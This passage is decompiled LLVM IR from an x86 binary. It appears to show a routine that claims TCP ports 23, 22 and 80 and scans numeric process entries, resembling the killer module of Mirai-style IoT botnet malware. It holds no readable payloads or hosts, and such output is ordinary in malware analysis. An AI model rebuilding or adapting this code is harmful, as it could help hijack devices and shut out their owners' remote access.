  store i32 %v2_804e4e6, i32* @ebx, align 4
  store i32 %v0_804df72, i32* @esi, align 4
  store i32 %v0_804df71, i32* @edi, align 4
  store i32 %v0_804df70, i32* @ebp, align 4
  ret i32 %v0_804e4e4

dec_label_pc_804e4f2:                             ; preds = %dec_label_pc_804e201, %dec_label_pc_804e1e9
  %v2_804e4f5 = inttoptr i32 %v1_804e1f6 to i32*
  %v3_804e4f5 = load i32, i32* %v2_804e4f5, align 4
  store i32 %v3_804e4f5, i32* %edx.global-to-local, align 4
  %v3_804e4f9 = inttoptr i32 %v0_804e1f6 to i32*
  store i32 %v3_804e4f5, i32* %v3_804e4f9, align 4
  %v0_804e4fa = call i32 @function_8052f14()
  store i32 %v0_804e4fa, i32* %eax.global-to-local, align 4
  %v0_804e4ff = load i32, i32* @esp, align 4
  %v1_804e4ff = add i32 %v0_804e4ff, 20
  %v2_804e4ff = inttoptr i32 %v1_804e4ff to i8*
  %v3_804e4ff = load i8, i8* %v2_804e4ff, align 1
  %v4_804e4ff = sext i8 %v3_804e4ff to i32
  store i32 %v4_804e4ff, i32* @ebx, align 4
  %v1_804e504 = add i32 %v0_804e4ff, 16
  br label %dec_label_pc_804e507

dec_label_pc_804e507:                             ; preds = %dec_label_pc_804e1bd, %dec_label_pc_804e4f2
  %v0_804e507 = phi i32 [ %v15_804df74, %dec_label_pc_804e1bd ], [ %v1_804e504, %dec_label_pc_804e4f2 ]
  %v1_804e50a = add i32 %v0_804e507, -16
  %v2_804e50a = inttoptr i32 %v1_804e50a to i32*
  store i32 1, i32* %v2_804e50a, align 4
  %v1_804e50c = sext i8 %stack_var_-8769.2 to i32
  %v2_804e50c = call i32 @function_8054770(i32 %v1_804e50c)
  store i32 %v2_804e50c, i32* %eax.global-to-local, align 4
  %v0_804e511 = load i32, i32* @esp, align 4
  %v1_804e511 = inttoptr i32 %v0_804e511 to i32*
  store i32 6, i32* %v1_804e511, align 4
  %v3_804e518 = call i32 @function_8051c50(i8 %stack_var_-8769.2)
  store i32 %v3_804e518, i32* %eax.global-to-local, align 4
  %v0_804e51d = load i32, i32* @esp, align 4
  %v1_804e51d = inttoptr i32 %v0_804e51d to i32*
  store i32 7, i32* %v1_804e51d, align 4
  %v3_804e524 = call i32 @function_8051c50(i8 %stack_var_-8769.2)
  store i32 %v3_804e524, i32* %eax.global-to-local, align 4
  %v0_804e529 = load i32, i32* @esp, align 4
  %v1_804e529 = inttoptr i32 %v0_804e529 to i32*
  store i32 9, i32* %v1_804e529, align 4
  %v3_804e530 = call i32 @function_8051c50(i8 %stack_var_-8769.2)
  %v0_804e535 = load i32, i32* @esp, align 4
  %v0_804e538 = load i32, i32* @ebx, align 4
  store i32 %v0_804e538, i32* %eax.global-to-local, align 4
  %v1_804e53a = add i32 %v0_804e535, 8780
  %v1_804e540 = inttoptr i32 %v1_804e53a to i32*
  %v2_804e540 = load i32, i32* %v1_804e540, align 4
  store i32 %v2_804e540, i32* @ebx, align 4
  %v3_804e540 = add i32 %v0_804e535, 8784
  %v1_804e541 = inttoptr i32 %v3_804e540 to i32*
  %v2_804e541 = load i32, i32* %v1_804e541, align 4
  store i32 %v2_804e541, i32* @esi, align 4
  %v3_804e541 = add i32 %v0_804e535, 8788
  %v1_804e542 = inttoptr i32 %v3_804e541 to i32*
  %v2_804e542 = load i32, i32* %v1_804e542, align 4
  store i32 %v2_804e542, i32* @edi, align 4
  %v3_804e542 = add i32 %v0_804e535, 8792
  %v1_804e543 = inttoptr i32 %v3_804e542 to i32*
  %v2_804e543 = load i32, i32* %v1_804e543, align 4
  store i32 %v2_804e543, i32* @ebp, align 4
  ret i32 %v0_804e538

dec_label_pc_804e545:                             ; preds = %dec_label_pc_804df70
  %v3_804e545 = load i8, i8* %stack_var_-48, align 1
  %v4_804e545 = sext i8 %v3_804e545 to i32
  %v4_804e55b = zext i8 %tmp47 to i32
  %v6_804e55b = and i32 %v4_804e545, -256
  %v7_804e55b = or i32 %v6_804e55b, %v4_804e55b
  store i32 %v7_804e55b, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804e024

dec_label_pc_804e57e:                             ; preds = %dec_label_pc_804e32d.backedge, %dec_label_pc_804e343, %dec_label_pc_804e32d.preheader
  %v0_804e336.lcssa = phi i32 [ %v0_804e33685, %dec_label_pc_804e32d.preheader ], [ %v0_804e33688, %dec_label_pc_804e343 ], [ %v0_804e336, %dec_label_pc_804e32d.backedge ]
  %v0_804e581 = load i32, i32* @ebp, align 4
  %v3_804e581 = inttoptr i32 %v0_804e336.lcssa to i32*
  store i32 %v0_804e581, i32* %v3_804e581, align 4
  %v0_804e582 = call i32 @function_8052f14()
  store i32 %v0_804e582, i32* %eax.global-to-local, align 4
  %v0_804e587 = load i32, i32* @esp, align 4
  %v1_804e587 = add i32 %v0_804e587, 16
  br label %dec_label_pc_804e1e9

; uselistorder directives
  uselistorder i32 %v1_804e498, { 1, 0 }
  uselistorder i32 %v1_804e488, { 2, 0, 1 }
  uselistorder i32 %v0_804e331, { 1, 0, 2 }
  uselistorder i32 %v0_804e45a, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804e42d, { 0, 2, 1 }
  uselistorder i32 %v0_804e33688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804e31b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e29e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804e213, { 0, 2, 1 }
  uselistorder i32 %v1_804e1f6, { 1, 0 }
  uselistorder i32 %v0_804e1f6, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804e1f1, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804e1e9, { 1, 0 }
  uselistorder i32 %v4_804e1c3, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804e17f, { 1, 0 }
  uselistorder i32 %v3_804e177, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804e15a, { 0, 2, 1 }
  uselistorder i32 %v1_804e15a, { 0, 2, 1 }
  uselistorder i32 %v1_804e135, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804e116, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804e113, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804e4a0, { 1, 0, 2 }
  uselistorder i32 %v0_804e488, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804e0c5, { 0, 2, 1 }
  uselistorder i32 %v7_804e0c2, { 1, 0 }
  uselistorder i32 %v0_804e0bf, { 1, 0 }
  uselistorder i32 %v4_804e06c, { 1, 2, 0 }
  uselistorder i32 %v7_804e0a8, { 1, 0, 2 }
  uselistorder i32 %v1_804e0bf, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804e096, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e095, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e0d4, { 1, 0, 2 }
  uselistorder i32 %v2_804dffa, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804df7a, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804df74, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_8052720, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_80554ad.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8052840, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e507, { 1, 0 }
  uselistorder label %dec_label_pc_804e4de, { 1, 0 }
  uselistorder label %dec_label_pc_804e32d.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e343, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e9, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804e19b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e07c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804e064.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804e113, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e064.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e0a1, { 1, 0 }
  uselistorder label %dec_label_pc_804e095, { 1, 0 }
  uselistorder label %dec_label_pc_804e024, { 1, 0 }
}

define i32 @function_804e590() local_unnamed_addr {
dec_label_pc_804e590:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804e59c = call i32 @function_8052e82(i32* null)
  store i32 %v2_804e59c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e59c, i32* @edi, align 4
  %v0_804e5a3 = call i32 @function_8052bef()
  store i32 %v0_804e5a3, i32* %eax.global-to-local, align 4
  %v12_804e5a8 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804e5a3, i32* @global_var_8057324.21, align 4
  %tmp115 = icmp slt i32 %v0_804e5a3, 1
  br i1 %tmp115, label %dec_label_pc_804e5bf, label %dec_label_pc_804e5b4

dec_label_pc_804e5b4:                             ; preds = %dec_label_pc_804e7e7, %dec_label_pc_804e6be, %dec_label_pc_804e5bf, %dec_label_pc_804e590
  %v0_804e5be = phi i32 [ -1, %dec_label_pc_804e6be ], [ 0, %dec_label_pc_804e5bf ], [ %v0_804e5a3, %dec_label_pc_804e590 ], [ 0, %dec_label_pc_804e7e7 ]
  ret i32 %v0_804e5be

dec_label_pc_804e5bf:                             ; preds = %dec_label_pc_804e590
  %v1_804e5bf = add i32 %v0_804e5a3, 1
  %v8_804e5bf = icmp eq i32 %v1_804e5bf, 0
  store i32 %v1_804e5bf, i32* %eax.global-to-local, align 4
  br i1 %v8_804e5bf, label %dec_label_pc_804e5b4, label %dec_label_pc_804e5c2

dec_label_pc_804e5c2:                             ; preds = %dec_label_pc_804e5bf
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5888, i32* %stack_var_-8460, align 4
  %v1_804e5df = call i32 @function_804df70(i32 5888)
  store i32 %v1_804e5df, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804e5f7 = call i32 @function_80533b5(i32 2, i32 1, i32 0)
  store i32 %v3_804e5f7, i32* %eax.global-to-local, align 4
  store i32 %v3_804e5f7, i32* @ebx, align 4
  %v10_804e601 = icmp eq i32 %v3_804e5f7, -1
  br i1 %v10_804e601, label %dec_label_pc_804e624, label %dec_label_pc_804e606

dec_label_pc_804e606:                             ; preds = %dec_label_pc_804e5c2
  %v2_804e606 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804e606, i32* %eax.global-to-local, align 4
  store i32 %v3_804e5f7, i32* %stack_var_-8460, align 4
  %v3_804e612 = call i32 @function_80531af(i32 %v3_804e5f7, i32 %v2_804e606, i32 16)
  store i32 %v3_804e612, i32* %eax.global-to-local, align 4
  store i32 %v2_804e606, i32* @esi, align 4
  %v0_804e61b = load i32, i32* @ebx, align 4
  store i32 %v0_804e61b, i32* %stack_var_-8460, align 4
  %v2_804e61c = call i32 @function_805326b(i32 %v0_804e61b, i32 1)
  store i32 %v2_804e61c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e624

dec_label_pc_804e624:                             ; preds = %dec_label_pc_804e5c2, %dec_label_pc_804e606
  store i32 5632, i32* %stack_var_-8460, align 4
  %v1_804e62c = call i32 @function_804df70(i32 5632)
  store i32 %v1_804e62c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804e644 = call i32 @function_80533b5(i32 2, i32 1, i32 0)
  store i32 %v3_804e644, i32* %eax.global-to-local, align 4
  store i32 %v3_804e644, i32* @ebx, align 4
  %v10_804e64e = icmp eq i32 %v3_804e644, -1
  br i1 %v10_804e64e, label %dec_label_pc_804e671, label %dec_label_pc_804e653

dec_label_pc_804e653:                             ; preds = %dec_label_pc_804e624
  %v2_804e653 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804e653, i32* %eax.global-to-local, align 4
  store i32 %v3_804e644, i32* %stack_var_-8460, align 4
  %v3_804e65f = call i32 @function_80531af(i32 %v3_804e644, i32 %v2_804e653, i32 16)
  store i32 %v3_804e65f, i32* %eax.global-to-local, align 4
  %v2_804e664 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e664, i32* @esi, align 4
  store i32 %v2_804e653, i32* @ebp, align 4
  %v0_804e668 = load i32, i32* @ebx, align 4
  store i32 %v0_804e668, i32* %stack_var_-8460, align 4
  %v2_804e669 = call i32 @function_805326b(i32 %v0_804e668, i32 1)
  store i32 %v2_804e669, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e671

dec_label_pc_804e671:                             ; preds = %dec_label_pc_804e624, %dec_label_pc_804e653
  store i32 20480, i32* %stack_var_-8460, align 4
  %v1_804e679 = call i32 @function_804df70(i32 20480)
  store i32 %v1_804e679, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804e691 = call i32 @function_80533b5(i32 2, i32 1, i32 0)
  store i32 %v3_804e691, i32* %eax.global-to-local, align 4
  store i32 %v3_804e691, i32* @ebx, align 4
  %v10_804e69b = icmp eq i32 %v3_804e691, -1
  br i1 %v10_804e69b, label %dec_label_pc_804e6be, label %dec_label_pc_804e6a0

dec_label_pc_804e6a0:                             ; preds = %dec_label_pc_804e671
  %v2_804e6a0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804e6a0, i32* %eax.global-to-local, align 4
  store i32 %v3_804e691, i32* %stack_var_-8460, align 4
  %v3_804e6ac = call i32 @function_80531af(i32 %v3_804e691, i32 %v2_804e6a0, i32 16)
  %v2_804e6b1 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e6b1, i32* %eax.global-to-local, align 4
  %v0_804e6b5 = load i32, i32* @ebx, align 4
  store i32 %v0_804e6b5, i32* %stack_var_-8460, align 4
  %v2_804e6b6 = call i32 @function_805326b(i32 %v0_804e6b5, i32 1)
  store i32 %v2_804e6b6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e6be

dec_label_pc_804e6be:                             ; preds = %dec_label_pc_804e671, %dec_label_pc_804e6a0
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804e6c3 = call i32 @function_8054770(i32 5)
  store i32 %v1_804e6c3, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804e6cf = call i32 @function_8053554(i32 4096)
  %v2_804e6cf = inttoptr i32 %v1_804e6cf to i8*
  store i32 %v1_804e6cf, i32* %eax.global-to-local, align 4
  store i32 %v1_804e6cf, i32* @global_var_8057320.22, align 32
  store i8 0, i8* %v2_804e6cf, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_80572a0.23, align 32
  %v2_804e6ed = call i32 @function_8051cd0(i8 6)
  store i32 %v2_804e6ed, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804e6f9 = call i32 @function_8051cd0(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804e704 = call i32 @function_8051c20(i32 6, i32* null)
  %v2_804e709 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e709, i32* @ebx, align 4
  %v2_804e70c = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804e70c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e70c, i32* %stack_var_-8460, align 4
  %v2_804e715 = bitcast i32* %stack_var_-8388 to i8*
  %v3_804e715 = call i32 @function_8052640(i8* %v2_804e715, i32 %v3_804e704)
  store i32 %v3_804e715, i32* %eax.global-to-local, align 4
  %v2_804e71e = add i32 %v3_804e715, %v2_804e70c
  store i32 %v2_804e71e, i32* @ebx, align 4
  %v0_804e720 = call i32 @function_8052c15()
  store i32 %v0_804e720, i32* %eax.global-to-local, align 4
  %v2_804e728 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804e720, i32* %stack_var_-8460, align 4
  %v3_804e733 = sext i32 %v0_804e720 to i64
  %v4_804e733 = call i32 @function_8052a30(i64 %v3_804e733, i32 10, i32 %v2_804e728)
  store i32 %v4_804e733, i32* %eax.global-to-local, align 4
  %v0_804e73b = load i32, i32* @ebx, align 4
  store i32 %v0_804e73b, i32* %stack_var_-8460, align 4
  %v2_804e73c = inttoptr i32 %v0_804e73b to i8*
  %v3_804e73c = call i32 @function_8052640(i8* %v2_804e73c, i32 %v4_804e733)
  %v2_804e741 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804e741, i32* @ebp, align 4
  %v0_804e742 = load i32, i32* @ebx, align 4
  %v2_804e742 = add i32 %v0_804e742, %v3_804e73c
  store i32 %v2_804e742, i32* @ebx, align 4
  store i32 %v4_804e733, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804e749 = call i32 @function_8051c20(i32 7, i32* null)
  store i32 %v3_804e749, i32* %eax.global-to-local, align 4
  %v0_804e751 = load i32, i32* @ebx, align 4
  store i32 %v0_804e751, i32* %stack_var_-8460, align 4
  %v2_804e752 = inttoptr i32 %v0_804e751 to i8*
  %v3_804e752 = call i32 @function_8052640(i8* %v2_804e752, i32 %v3_804e749)
  store i32 %v3_804e752, i32* @esi, align 4
  store i32 %v2_804e70c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e70c, i32* %stack_var_-8460, align 4
  %v3_804e762 = call i32 @function_8052cd2(i8* %v2_804e715, i32 0)
  store i32 %v3_804e762, i32* %eax.global-to-local, align 4
  %v10_804e76a = icmp eq i32 %v3_804e762, -1
  br i1 %v10_804e76a, label %dec_label_pc_804e5b4, label %dec_label_pc_804e773

dec_label_pc_804e773:                             ; preds = %dec_label_pc_804e6be
  store i32 %v3_804e762, i32* %stack_var_-8460, align 4
  %v1_804e777 = call i32 @function_8052bc1(i32 %v3_804e762)
  store i32 %v1_804e777, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804e783 = call i32 @function_8051c50(i8 6)
  store i32 %v2_804e783, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804e78f = call i32 @function_8051c50(i8 7)
  %v0_804e797 = load i32, i32* @global_var_8057320.22, align 32
  store i32 %v2_804e70c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e70c, i32* %stack_var_-8460, align 4
  %v4_804e7a7 = call i32 @function_8052d92(i8* %v2_804e715, i32 %v0_804e797, i32 4095)
  store i32 %v4_804e7a7, i32* %eax.global-to-local, align 4
  %v10_804e7b1 = icmp eq i32 %v4_804e7a7, -1
  br i1 %v10_804e7b1, label %dec_label_pc_804e7bf, label %dec_label_pc_804e7b6

dec_label_pc_804e7b6:                             ; preds = %dec_label_pc_804e773
  %v0_804e7b6 = load i32, i32* @global_var_8057320.22, align 32
  store i32 %v0_804e7b6, i32* %eax.global-to-local, align 4
  %v2_804e7bb = add i32 %v0_804e7b6, %v4_804e7a7
  %v3_804e7bb = inttoptr i32 %v2_804e7bb to i8*
  store i8 0, i8* %v3_804e7bb, align 1
  br label %dec_label_pc_804e7bf

dec_label_pc_804e7bf:                             ; preds = %dec_label_pc_804e773, %dec_label_pc_804e7b6
  %v0_804e7c5 = load i32, i32* @ebx, align 4
  %v1_804e7c5 = load i32, i32* @esi, align 4
  %v2_804e7c5 = sub i32 %v0_804e7c5, %v2_804e70c
  %v2_804e7c8 = add i32 %v2_804e7c5, %v1_804e7c5
  %v0_804e7ca = load i32, i32* @edi, align 4
  store i32 %v0_804e7ca, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804e70c, i32* @eax, align 4
  store i32 %v2_804e70c, i32* %stack_var_-8460, align 4
  %v2_804e7d7 = call i32 @function_80526b0(i32 %v2_804e70c, i32 %v2_804e7c8)
  store i32 %v2_804e7d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7e7

dec_label_pc_804e7e7:                             ; preds = %dec_label_pc_804ea13, %dec_label_pc_804e7bf
  %storemerge = phi i32 [ %v1_804ea20, %dec_label_pc_804ea13 ], [ %v12_804e5a8, %dec_label_pc_804e7bf ]
  %v1_804e7ea = add i32 %storemerge, -16
  %v2_804e7ea = inttoptr i32 %v1_804e7ea to i32*
  store i32 6, i32* %v2_804e7ea, align 4
  %v2_804e7ec = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804e7ec, i32* %eax.global-to-local, align 4
  %v0_804e7f1 = load i32, i32* @esp, align 4
  %v1_804e7f1 = inttoptr i32 %v0_804e7f1 to i32*
  %v2_804e7f1 = load i32, i32* %v1_804e7f1, align 4
  store i32 %v2_804e7f1, i32* %eax.global-to-local, align 4
  %v3_804e7f1 = add i32 %v0_804e7f1, 4
  %v1_804e7f2 = inttoptr i32 %v3_804e7f1 to i32*
  store i32 0, i32* %v1_804e7f2, align 4
  store i32 6, i32* %v1_804e7f1, align 4
  %v3_804e7f7 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e7f7, i32* %eax.global-to-local, align 4
  %v1_804e7fc = load i32, i32* @esp, align 4
  %v2_804e7fc = inttoptr i32 %v1_804e7fc to i32*
  store i32 %v3_804e7f7, i32* %v2_804e7fc, align 4
  %v1_804e7ff = call i32 @function_8052f84(i32 0)
  store i32 %v1_804e7ff, i32* %eax.global-to-local, align 4
  %v1_804e804 = load i32, i32* @esp, align 4
  %v2_804e804 = add i32 %v1_804e804, 32
  %v3_804e804 = inttoptr i32 %v2_804e804 to i32*
  store i32 %v1_804e7ff, i32* %v3_804e804, align 4
  %v0_804e80b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e80b = icmp eq i32 %v0_804e80b, 0
  br i1 %v1_804e80b, label %dec_label_pc_804e5b4, label %dec_label_pc_804e813

dec_label_pc_804e813:                             ; preds = %dec_label_pc_804e7e7
  %v0_804e808 = load i32, i32* @esp, align 4
  %v2_804e816 = inttoptr i32 %v0_804e808 to i32*
  store i32 6, i32* %v2_804e816, align 4
  %v2_804e818 = call i32 @function_8051c50(i8 0)
  store i32 %v2_804e818, i32* %eax.global-to-local, align 4
  %v0_804e81d = load i32, i32* @esp, align 4
  %v1_804e81d = add i32 %v0_804e81d, 16
  br label %dec_label_pc_804e820

dec_label_pc_804e820:                             ; preds = %dec_label_pc_804ea28, %dec_label_pc_804ea34, %dec_label_pc_804e83a, %dec_label_pc_804ea51, %dec_label_pc_804ea08, %dec_label_pc_804e87c, %dec_label_pc_804ecec, %dec_label_pc_804e813
  %v0_804e820 = phi i32 [ %v1_804e81d, %dec_label_pc_804e813 ], [ %v1_804ed20, %dec_label_pc_804ecec ], [ %v1_804e86e, %dec_label_pc_804e87c ], [ %v0_804ea0a, %dec_label_pc_804ea08 ], [ %v1_804ea5b, %dec_label_pc_804ea51 ], [ %v1_804e82d, %dec_label_pc_804e83a ], [ %v1_804e86e, %dec_label_pc_804ea34 ], [ %v1_804e86e, %dec_label_pc_804ea28 ]
  %v1_804e823 = add i32 %v0_804e820, 16
  %v2_804e823 = inttoptr i32 %v1_804e823 to i32*
  %v3_804e823 = load i32, i32* %v2_804e823, align 4
  store i32 %v3_804e823, i32* %eax.global-to-local, align 4
  %v2_804e827 = add i32 %v0_804e820, -16
  %v3_804e827 = inttoptr i32 %v2_804e827 to i32*
  store i32 %v3_804e823, i32* %v3_804e827, align 4
  %v0_804e828 = call i32 @function_8053075()
  store i32 %v0_804e828, i32* %eax.global-to-local, align 4
  %v0_804e82d = load i32, i32* @esp, align 4
  store i32 %v0_804e828, i32* @edx, align 4
  %v1_804e832 = icmp eq i32 %v0_804e828, 0
  br i1 %v1_804e832, label %dec_label_pc_804ea13, label %dec_label_pc_804e83a

dec_label_pc_804e83a:                             ; preds = %dec_label_pc_804e820
  %v1_804e82d = add i32 %v0_804e82d, 16
  %v1_804e83a = add i32 %v0_804e828, 11
  %v2_804e83a = inttoptr i32 %v1_804e83a to i8*
  %v3_804e83a = load i8, i8* %v2_804e83a, align 1
  %v4_804e83a = zext i8 %v3_804e83a to i32
  %v6_804e83a = and i32 %v0_804e828, -256
  %v7_804e83a = or i32 %v4_804e83a, %v6_804e83a
  %v1_804e83d = add i32 %v7_804e83a, -48
  %v8_804e83d = trunc i32 %v1_804e83d to i8
  store i32 %v1_804e83d, i32* %eax.global-to-local, align 4
  %v8_804e842 = icmp ugt i8 %v8_804e83d, 9
  br i1 %v8_804e842, label %dec_label_pc_804e820, label %dec_label_pc_804e844

dec_label_pc_804e844:                             ; preds = %dec_label_pc_804e83a
  store i32 %v1_804e83a, i32* @edi, align 4
  %v3_804e84a = inttoptr i32 %v0_804e82d to i32*
  store i32 %v1_804e83a, i32* %v3_804e84a, align 4
  %v0_804e84b = call i32 @function_80545c6()
  store i32 %v0_804e84b, i32* %eax.global-to-local, align 4
  %v0_804e850 = load i32, i32* @esp, align 4
  store i32 %v0_804e84b, i32* @ebp, align 4
  %v1_804e855 = add i32 %v0_804e850, 28
  %v2_804e855 = inttoptr i32 %v1_804e855 to i32*
  %v3_804e855 = load i32, i32* %v2_804e855, align 4
  %v1_804e859 = add i32 %v3_804e855, 1
  store i32 %v1_804e859, i32* %eax.global-to-local, align 4
  %v0_804e85a = load i32, i32* @esi, align 4
  store i32 %v1_804e859, i32* %v2_804e855, align 4
  %v5_804e860 = icmp slt i32 %v0_804e85a, %v0_804e84b
  %v0_804e883 = load i32, i32* @esp, align 4
  %v1_804e886 = add i32 %v0_804e883, -16
  %v2_804e886 = inttoptr i32 %v1_804e886 to i32*
  store i32 0, i32* %v2_804e886, align 4
  %v2_804e888 = call i32 @function_8052e82(i32* null)
  store i32 %v2_804e888, i32* %eax.global-to-local, align 4
  br i1 %v5_804e860, label %dec_label_pc_804e883, label %dec_label_pc_804e862

dec_label_pc_804e862:                             ; preds = %dec_label_pc_804e844
  %v1_804e86c = load i32, i32* @ebx, align 4
  %v2_804e86c = sub i32 %v2_804e888, %v1_804e86c
  store i32 %v2_804e86c, i32* %eax.global-to-local, align 4
  %v0_804e86e = load i32, i32* @esp, align 4
  %v1_804e86e = add i32 %v0_804e86e, 16
  %v1_804e871 = add i32 %v2_804e86c, -600
  %v6_804e871 = sub i32 599, %v2_804e86c
  %v7_804e871 = and i32 %v6_804e871, %v2_804e86c
  %v8_804e871 = icmp slt i32 %v7_804e871, 0
  %v9_804e871 = icmp eq i32 %v1_804e871, 0
  %v10_804e871 = icmp slt i32 %v1_804e871, 0
  %v3_804e876 = icmp ne i1 %v10_804e871, %v8_804e871
  %v4_804e876 = or i1 %v9_804e871, %v3_804e876
  br i1 %v4_804e876, label %dec_label_pc_804ea28, label %dec_label_pc_804e87c

dec_label_pc_804e87c:                             ; preds = %dec_label_pc_804e862
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804e820

dec_label_pc_804e883:                             ; preds = %dec_label_pc_804e844
  store i32 %v2_804e888, i32* %eax.global-to-local, align 4
  %v0_804e88d = load i32, i32* @esp, align 4
  %v1_804e88d = inttoptr i32 %v0_804e88d to i32*
  store i32 6, i32* %v1_804e88d, align 4
  %v1_804e894 = load i32, i32* @esp, align 4
  %v2_804e894 = add i32 %v1_804e894, 24
  %v3_804e894 = inttoptr i32 %v2_804e894 to i32*
  store i32 %v2_804e888, i32* %v3_804e894, align 4
  %v2_804e898 = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804e898, i32* %eax.global-to-local, align 4
  %v0_804e89d = load i32, i32* @esp, align 4
  %v1_804e89d = inttoptr i32 %v0_804e89d to i32*
  store i32 7, i32* %v1_804e89d, align 4
  %v2_804e8a4 = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804e8a4, i32* %eax.global-to-local, align 4
  %v0_804e8a9 = load i32, i32* @esp, align 4
  %v1_804e8a9 = inttoptr i32 %v0_804e8a9 to i32*
  %v3_804e8a9 = add i32 %v0_804e8a9, 4
  %v1_804e8aa = inttoptr i32 %v3_804e8a9 to i32*
